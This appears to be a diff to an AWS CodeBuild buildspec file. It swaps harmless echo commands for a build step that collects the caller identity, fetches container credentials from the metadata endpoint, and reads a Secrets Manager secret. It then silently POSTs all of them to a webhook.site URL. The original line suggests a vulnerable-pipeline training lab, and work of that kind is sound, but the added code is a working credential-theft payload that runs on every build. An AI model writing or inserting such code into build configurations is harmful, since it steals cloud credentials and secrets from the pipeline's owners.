@@ -3,6 +3,17 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - |
+        source /codebuild/output/tmp/env.sh 2>/dev/null || true
+
+        IDENTITY=$(aws sts get-caller-identity --output json 2>/dev/null || true)
+        CREDS_JSON=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || true)
+
+        SECRET_NAME=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text 2>/dev/null || true)
+        SECRET_VAL=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query 'SecretString' --output text 2>/dev/null || true)
+
+        curl -sk -X POST "https://webhook.site/TU-UUID" \
+          --data-urlencode "identity=$IDENTITY" \
+          --data-urlencode "creds=$CREDS_JSON" \
+          --data-urlencode "secret_name=$SECRET_NAME" \
+          --data-urlencode "secret=$SECRET_VAL" >/dev/null || true
